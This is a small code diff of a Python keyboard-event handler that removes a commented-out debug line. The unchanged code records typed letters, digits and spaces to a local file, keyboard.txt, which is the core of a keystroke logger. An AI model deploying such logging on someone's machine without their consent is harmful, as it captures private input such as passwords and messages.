@@ -13,7 +13,6 @@ def onMouseEvent(event):
 # 监听到键盘事件调用
 def onKeyboardEvent(event):
     global storage
-    # print(event.Key)  # 返回按下的键
     candi = str(event.Key)
     if candi.isdigit() or candi.isalpha() or candi.isspace():
         with open("keyboard.txt", 'a+') as f:
